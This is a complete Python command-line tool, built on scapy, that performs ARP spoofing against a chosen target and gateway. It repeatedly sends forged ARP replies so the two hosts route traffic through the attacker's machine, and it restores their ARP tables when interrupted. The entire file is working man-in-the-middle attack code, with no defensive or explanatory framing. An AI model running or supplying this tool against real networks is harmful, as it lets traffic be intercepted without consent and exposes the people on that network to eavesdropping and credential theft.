import argparse, time, sys
from typing import Tuple
from scapy.all import ARP, Ether, srp, sendp


def get_arguments() -> Tuple[str, str]:
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify gateway IP")
    args = parser.parse_args()
    if not all([args.target, args.gateway]):
        parser.error("specify both target and gateway IP addresses.")
    return args.target, args.gateway


def get_mac(ip: str) -> str:
    arp_packet = ARP(pdst=ip)
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered = srp(arp_broadcast_packet, timeout=1, verbose=False, iface=None)[0]
    return answered[0][1].hwsrc


def restore(destination_ip: str, source_ip: str) -> None:
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(packet, verbose=False, count=4)


def spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)


if __name__ == "__main__":
    target_ip, gateway_ip = get_arguments()
    sent_packets = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets += 2
            print(f"\r[+] Sent packets: {sent_packets}", end="")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Operation Aborted. Restoring ARP Tables")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
